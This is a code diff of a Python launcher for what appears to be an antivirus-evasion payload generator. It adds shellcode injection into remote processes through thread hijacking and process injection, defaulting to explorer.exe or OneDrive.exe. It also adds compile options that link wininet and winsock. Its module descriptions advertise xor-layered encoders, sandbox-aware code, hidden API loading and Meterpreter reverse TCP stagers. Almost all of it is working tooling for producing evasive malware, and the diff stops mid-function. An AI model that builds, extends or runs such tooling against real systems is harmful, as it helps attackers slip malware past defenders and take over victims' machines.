         elif "windows" in module_type and arch == "x64":
- 
-            filename += ".exe"
 
-            subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-no-pie'],shell=True)
+            if link == "":
+
+                subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-no-pie'],shell=True)
+            
+            elif link == "wininet":
+
+                subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-no-pie','-lwininet'],shell=True)
+
+            elif link == "winsock":
+
+                subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-no-pie','-lws2_32'],shell=True)
 
         elif "linux" in module_type and arch == "x86":
 
@@ -1101,7 +1164,7 @@ def shellcode_options():
     print("[2] Custom shellcode\n")
     print("[0] Back\n")
 
-    ans=InputFunc("\n[>] Please insert choice\'s number: ")        
+    ans=InputFunc("\n[>] Please insert option: ")        
     return ans  
 
 def module_launcher1(module_choice):
@@ -1126,6 +1189,35 @@ def module_launcher1(module_choice):
 
     CustomOpt=InputFunc("\n[>] Custom msfvenom options(default: blank): ")
 
+    if ("ThreadExecutionHijack" in module_choice) or ("ProcessInject" in module_choice):
+
+        if ("ThreadExecutionHijack" in module_choice):
+
+            print(bcolors.OCRA + "\n[<ThreadHijack>] Target process:" + bcolors.ENDC)
+
+        elif ("ProcessInject" in module_choice):
+
+            print(bcolors.OCRA + "\n[<ProcessInject>] Target process:" + bcolors.ENDC)
+
+        if "x64" not in payload_choice:
+
+            Proc_arch = "x86"
+            Proc_target=InputFunc("\n[>] Please insert x86 target process (default:OneDrive.exe):")
+
+            if Proc_target == "":
+
+               Proc_target = "OneDrive.exe"
+
+        else:
+
+            Proc_arch = "x64"
+            Proc_target=InputFunc("\n[>] Please insert x64 target process (default:explorer.exe):")
+
+            if Proc_target == "":
+
+               Proc_target = "explorer.exe"
+
+
     if "x64" in payload_choice:
 
         Arc = "x64"
@@ -1145,7 +1237,10 @@ def module_launcher1(module_choice):
 
     print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC) 
 
-    Payload = payload_generator(payload_choice,Arc,commtype,port,CustomOpt,"c")
+    Payload = payload_generator(payload_choice,Arc,commtype,port,CustomOpt,"c") 
+
+    with open("payload.txt","w") as payload_file:
+        payload_file.write(Payload)
 
     if enc_type == "2":
         print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
@@ -1161,11 +1256,31 @@ def module_launcher1(module_choice):
 
     if platform.system() == "Linux":
 
-        subprocess.call(['python',module_where,Payload,Procnumb,enc_type])
+        if "ThreadExecutionHijack" in module_choice:
+
+            subprocess.call(['python',module_where,Procnumb,enc_type,Proc_arch,Proc_target])
+
+        elif "ProcessInject" in module_choice:
+
+            subprocess.call(['python',module_where,Procnumb,enc_type,Proc_target])
+
+        else:
+
+            subprocess.call(['python',module_where,Procnumb,enc_type])
 
     elif platform.system() == "Windows":
+
+        if "ThreadExecutionHijack" in module_choice:
         
-        subprocess.call(['py',module_where,Payload,Procnumb,enc_type])
+            subprocess.call(['py',module_where,Procnumb,enc_type,Proc_arch,Proc_target])
+
+        elif "ProcessInject" in module_choice:
+
+            subprocess.call(['py',module_where,Procnumb,enc_type,Proc_target])
+
+        else:
+
+            subprocess.call(['py',module_where,Procnumb,enc_type])
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 
 
@@ -1181,6 +1296,38 @@ def module_launcher2(module_choice):
     output_filename = InputFunc("\n[>] Enter output filename: ")
     arch = InputFunc("\n[>] Please insert compiler option (x86 or x64): ")
 
+    if ("ThreadExecutionHijack" in module_choice) or ("ProcessInject" in module_choice):
+
+        if ("ThreadExecutionHijack" in module_choice):
+
+            print(bcolors.OCRA + "[<ThreadHijack>] Target process architecture:\n\n" + bcolors.ENDC)
+
+        elif ("ProcessInject" in module_choice):
+
+            print(bcolors.OCRA + "\n[<ProcessInject>] Target process:" + bcolors.ENDC)
+
+        if arch == "x86":
+
+            Proc_arch == "x86"
+            Proc_target=InputFunc("\n[>] Please insert x86 target process (default:OneDrive.exe):")
+
+            if Proc_target == "":
+
+               Proc_target = "OneDrive.exe"
+
+        elif arch == "x64":
+
+            Proc_arch == "x64"
+            Proc_target=InputFunc("\n[>] Please insert x64 target process (default:explorer.exe):")
+
+            if Proc_target == "":
+
+               Proc_target = "explorer.exe"
+
+        else:
+            pass
+
+
     module_choice = "Modules/payloads/" + module_choice
 
     Payload = custom_payload_completer(custom_shellcode)
@@ -1191,7 +1338,16 @@ def module_launcher2(module_choice):
 
     print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC)
 
-    subprocess.call(['python',module_choice,Payload,Procnumb,enc_type])
+    if "ThreadExecutionHijack" in module_choice:
+
+        subprocess.call(['python',module_choice,Payload,Procnumb,enc_type,Proc_arch,Proc_target])
+
+    elif "ProcessInject" in module_choice:
+
+        subprocess.call(['python',module_choice,Payload,Procnumb,enc_type,Proc_target])
+
+    else:
+        subprocess.call(['python',module_choice,Payload,Procnumb,enc_type])
 
     if enc_type == "2":
         print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
@@ -1225,10 +1381,10 @@ def encoding_selection32():
     py_version=platform.python_version()
     print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
     sleep(0.2)
-    print("[1] x86/shikata_ga_nai                                   (average)\n")
-    print("[2] x86/shikata_ga_nai + Multibyte-key xor                  (good)\n")
-    print("[3] x86/shikata_ga_nai + Double Multibyte-key xor      (excellent)\n")
-    print("[4] x86/shikata_ga_nai + Triple Multibyte-key xor      (excellent)\n")
+    print("[1] x86/xor_dynamic                                   (average)\n")
+    print("[2] x86/xor_dynamic + Multibyte-key xor                  (good)\n")
+    print("[3] x86/xor_dynamic + Double Multibyte-key xor      (excellent)\n")
+    print("[4] x86/xor_dynamic + Triple Multibyte-key xor      (excellent)\n")
 
     enc_type = InputFunc("\n[>] Please enter options number: ")
 
@@ -1238,10 +1394,10 @@ def encoding_selection64():
     py_version=platform.python_version()
     print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
     sleep(0.2)
-    print("[1] x64/xor                                             (average)\n")
-    print("[2] x64/xor + Multibyte-key xor                            (good)\n")
-    print("[3] x64/xor + Double Multibyte-key xor                (excellent)\n")
-    print("[4] x64/xor + Triple Multibyte-key xor                (excellent)\n")
+    print("[1] x64/xor_dynamic                                    (average)\n")
+    print("[2] x64/xor_dynamic + Multibyte-key xor                   (good)\n")
+    print("[3] x64/xor_dynamic + Double Multibyte-key xor       (excellent)\n")
+    print("[4] x64/xor_dynamic + Triple Multibyte-key xor       (excellent)\n")
 
     enc_type = InputFunc("\n[>] Please enter options number: ")
 
@@ -1426,6 +1582,35 @@ def Polymorphic_C_Meterpreter_launcher(module_type):
 
     LHOST=InputFunc("\n[>] Please insert LHOST: ")
     LPORT=InputFunc("\n[>] Please insert LPORT: ")
+
+    if "x64" in module_type:
+
+        if "ThreadExecutionHijack" in module_type:
+
+            print(bcolors.OCRA + "\n[<ThreadHijack>] Target process:" + bcolors.ENDC)
+
+            Proc_target=InputFunc("\n[>] Please insert x64 target process (default:explorer.exe):")
+
+            if Proc_target == "":
+
+                Proc_target = "explorer.exe"
+
+        Arch="x64"
+
+    else:
+
+        if "ThreadExecutionHijack" in module_type:
+
+            print(bcolors.OCRA + "\n[<ThreadHijack>] Target process:" + bcolors.ENDC)
+
+            Proc_target=InputFunc("\n[>] Please insert x86 target process (default:OneDrive.exe):")
+
+            if Proc_target == "":
+
+                Proc_target = "OneDrive.exe"
+
+        Arch="x86"
+
     OUTFILE=InputFunc("\n[>] Please insert output filename: ")
 
     sleep(0.5)
@@ -1436,25 +1621,39 @@ def Polymorphic_C_Meterpreter_launcher(module_type):
     
     if platform.system() == "Linux":
 
-        subprocess.call(['python','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb])
+        if "ThreadExecutionHijack" in module_type:
+
+            subprocess.call(['python','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb,Proc_target])
+
+        else:
+
+            subprocess.call(['python','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb])
 
     elif platform.system() == "Windows":
         
-        subprocess.call(['py','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb])
+
+        if "ThreadExecutionHijack" in module_type:
+
+            subprocess.call(['py','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb,Proc_target])
+
+        else:
+
+            subprocess.call(['py','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb])
+
 
     sleep(0.5)
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
 
-    if "x64" in module_type:
+    if "Https" in module_type:
 
-        Arch="x64"
+        link="wininet"
 
     else:
 
-        Arch="x86"
+        link="winsock"
 
-    auto_compiler("windows",Arch,OUTFILE,True)
+    auto_compiler("windows",Arch,OUTFILE,link)
 
     print("\n[<>] File saved in Phantom-Evasion folder\n")
     Enter2Continue()
@@ -2080,7 +2279,7 @@ def description_printer(module_type):
     print("\n[+] MODULE DESCRIPTION:\n") 
     
 
-    if module_type == "Polymorphic_MVA_mathinject_windows.py":
+    if module_type == "ShellcodeInjection_virtual_windows.py":
         description = ""
         description += "  This module generate and compile\n"
         description += "  Windows executable written in c capable to \n"
@@ -2088,22 +2287,22 @@ def description_printer(module_type):
         description += "  VirtualAlloc API. \n\n"
         description += "  [>] Memory allocation type: VIRTUAL\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
-        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
-        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
-        description += "  64bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + Multibyte xor\n"
-        description += "  [3] x64/xor + Double-key multibyte xor\n"
-        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
-    elif module_type == "Polymorphic_MHA_mathinject_windows.py":
+    elif module_type == "ShellcodeInjection_heap_windows.py":
         description = ""
         description += "  This module generate and compile\n"
         description += "  Windows executable written in c capable to \n"
@@ -2111,107 +2310,251 @@ def description_printer(module_type):
         description += "  HeapAlloc and HeapCreate API. \n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
-        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
-        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
-        description += "  64bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + Multibyte xor\n"
-        description += "  [3] x64/xor + Double-key multibyte xor\n"
-        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
-    elif module_type == "Polymorphic_MVA_NDC_LLGPA_mathinject_windows.py":
+    elif module_type == "ShellcodeInjection_virtualNDC_LLGPA_windows.py":
         description = ""
-        description += "  This module behave like Polymorphic MultipathVirtualAlloc but\n"
-        description += "  it use LoadLibrary() and GetProcAddress() to load at runtime VirtualAlloc \n"
-        description += "  without direct call\n\n"
+        description += "  This module behave like Windows Shellcode Injection VirtualAlloc but\n"
+        description += "  it use LoadLibrary() and GetProcAddress() to load at\n"
+        description += "  runtime Windows API without direct call\n\n"
         description += "  [>] Memory allocation type: VIRTUAL\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  32bit ENCODER avaiable: \n"
+        description += "  32bit ENCODERS: \n"
         description += "  [1] x86/shikata_ga_nai\n"
         description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
         description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
         description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
-        description += "  64bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + Multibyte xor\n"
-        description += "  [3] x64/xor + Double-key multibyte xor\n"
-        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
-    elif module_type == "Polymorphic_MVA_NDC_GPAGMH_mathinject_windows.py":
+    elif module_type == "ShellcodeInjection_virtualNDC_GPAGMH_windows.py":
         description = ""
-        description += "  This module behave like Polymorphic MultipathVirtualAlloc but\n"
-        description += "  it use GetProcAddress() and GetMonduleHandle() to load at runtime VirtualAlloc \n"
-        description += "  without direct call\n\n"
+        description += "  This module behave like Windows Shellcode Injection VirtualAlloc but\n"
+        description += "  it use GetProcAddress() and GetMonduleHandle() to load at\n"
+        description += "  runtime Windows API without direct call\n\n"
         description += "  [>] Memory allocation type: VIRTUAL\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
-        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
-        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
-        description += "  64bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + Multibyte xor\n"
-        description += "  [3] x64/xor + Double-key multibyte xor\n"
-        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
-    elif module_type == "Polymorphic_MHA_NDC_LLGPA_mathinject_windows.py":
+    elif module_type == "ShellcodeInjection_heapNDC_LLGPA_windows.py":
         description = ""
-        description += "  This module behave like Shellcode Injection HeapAlloc but\n"
-        description += "  it use LoadLibrary() and GetProcAddress() to load at runtime HeapCreate and \n"
-        description += "  HeapAlloc without direct call\n\n"
+        description += "  This module behave like Windows Shellcode Injection HeapAlloc but\n"
+        description += "  it use LoadLibrary() and GetProcAddress() to load at\n"
+        description += "  runtime Windows API without direct call\n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
-        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
-        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
-        description += "  64bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + Multibyte xor\n"
-        description += "  [3] x64/xor + Double-key multibyte xor\n"
-        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
 
-    elif module_type == "Polymorphic_MHA_NDC_GPAGMH_mathinject_windows.py":
+    elif module_type == "ShellcodeInjection_heapNDC_GPAGMH_windows.py":
         description = ""
         description += "  This module behave like Shellcode Injection HeapAlloc but\n"
-        description += "  it use GetProcAddress() and GetMonduleHandle() to load at runtime HeapCreate and \n"
-        description += "  HeapAlloc without direct call\n\n"
+        description += "  it use GetProcAddress() and GetMonduleHandle() to load at \n"
+        description += "  runtime Windows API without direct call\n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
-        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
-        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
-        description += "  64bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + Multibyte xor\n"
-        description += "  [3] x64/xor + Double-key multibyte xor\n"
-        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif module_type == "ShellcodeInjection_ProcessInject_windows.py":
+        description = ""
+        description += "  This module generate and compile\n"
+        description += "  Windows executable written in c capable to \n"
+        description += "  inject and execute shellcode into remote process memory using \n"
+        description += "  VirtualAllocEx and WriteProcessMemory API. \n\n"
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+
+    elif module_type == "ShellcodeInjection_ProcessInject_NDC_LLGPA_windows.py":
+        description = ""
+        description += "  This module behave like Windows Shellcode Injection Process Inject but\n"
+        description += "  it use LoadLibrary() and GetProcAddress() to load at\n"
+        description += "  runtime Windows API without direct call\n\n"
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+    elif module_type == "ShellcodeInjection_ProcessInject_NDC_GPAGMH_windows.py":
+        description = ""
+        description += "  This module behave like Shellcode Injection Process Inject but\n"
+        description += "  it use GetProcAddress() and GetMonduleHandle() to load at \n"
+        description += "  runtime Windows API without direct call\n\n"
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif module_type == "ShellcodeInjection_ThreadExecutionHijack_windows.py":
+        description = ""
+        description += "  This module generate and compile\n"
+        description += "  Windows executable written in c capable to \n"
+        description += "  inject and execute shellcode into remote process thread using \n"
+        description += "  VirtualAllocEx and Suspend/ResumeThread Get/SetThreadContext API. \n\n"
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  No CreateThread/CreateRemoteThread call \n"  
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+
+    elif module_type == "ShellcodeInjection_ThreadExecutionHijack_NDC_LLGPA_windows.py":
+        description = ""
+        description += "  This module behave like Windows Shellcode Injection Thread Hijack but\n"
+        description += "  it use LoadLibrary() and GetProcAddress() to load at\n"
+        description += "  runtime Windows API without direct call\n\n"
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  No CreateThread/CreateRemoteThread call \n" 
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+    elif module_type == "ShellcodeInjection_ThreadExecutionHijack_NDC_GPAGMH_windows.py":
+        description = ""
+        description += "  This module behave like Shellcode Injection Thread Hijack but\n"
+        description += "  it use GetProcAddress() and GetMonduleHandle() to load at \n"
+        description += "  runtime Windows API without direct call\n\n"
+        description += "  [>] Memory allocation type: VIRTUAL\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  No CreateThread/CreateRemoteThread call \n" 
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
     elif module_type == "Polymorphic_PowershellOnelineDropper_windows.py":
@@ -2236,23 +2579,23 @@ def description_printer(module_type):
         description += "  work against 64 bit targets (like other modules) be sure to use\n"
         description += "  64 bit payloads in that case\n"
 
-    elif module_type == "Polymorphic_MHA_mathinject_linux.py":
+    elif module_type == "ShellcodeInjection_heap_linux.py":
         description = ""
         description += "  This module generate and compile\n"
         description += "  Linux executable written in c capable to \n"
         description += "  inject and execute shellcode in memory (heap) \n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
-        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
-        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
-        description += "  64bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + Multibyte xor\n"
-        description += "  [3] x64/xor + Double-key multibyte xor\n"
-        description += "  [4] x64/xor + Triple-key multibyte xor\n"
+        description += "  32bit ENCODERS: \n"
+        description += "  [1] x86/xor_dynamic\n"
+        description += "  [2] x86/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x86/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x86/xor_dynamic + Triple-key multibyte xor\n"
+        description += "  64bit ENCODERS: \n"
+        description += "  [1] x64/xor_dynamic\n"
+        description += "  [2] x64/xor_dynamic + Multibyte xor\n"
+        description += "  [3] x64/xor_dynamic + Double-key multibyte xor\n"
+        description += "  [4] x64/xor_dynamic + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
@@ -2331,20 +2674,31 @@ def description_printer(module_type):
         description += "  counters injection in method\n"
         description += "  [>] OUTFORMAT: Apk \n"
 
-    elif module_type == "Polymorphic_BashOnelinerDropper_mathinject_linux.py":
+    elif module_type == "ShellcmdDropper_linux.py":
         description = ""
         description += "  This Module generate and compile \n"
-        description += "  Linux oneline payload dropper written in c \n"
+        description += "  Linux oneline cmd/bash payload dropper written in c \n"
         description += "  [>] METHOD: system() call\n"
         description += "  [>] Payload type: Oneliner payload\n\n"
 
-    elif module_type == "Polymorphic_C_x86ReverseTcpMeterpreter_windows.py":
+    elif (module_type == "x86ReverseTcpMeterpreter_virtual_C_windows.py") or (module_type == "x64ReverseTcpMeterpreter_virtual_C_windows.py"):
 
         description = ""
         description += "  This Module generate and compile\n"
-        description += "  32bit pure c meterpreter reverse tcp stagers. \n"
-        description += "  Require msfconsole multi/handler listener\n"
-        description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
+
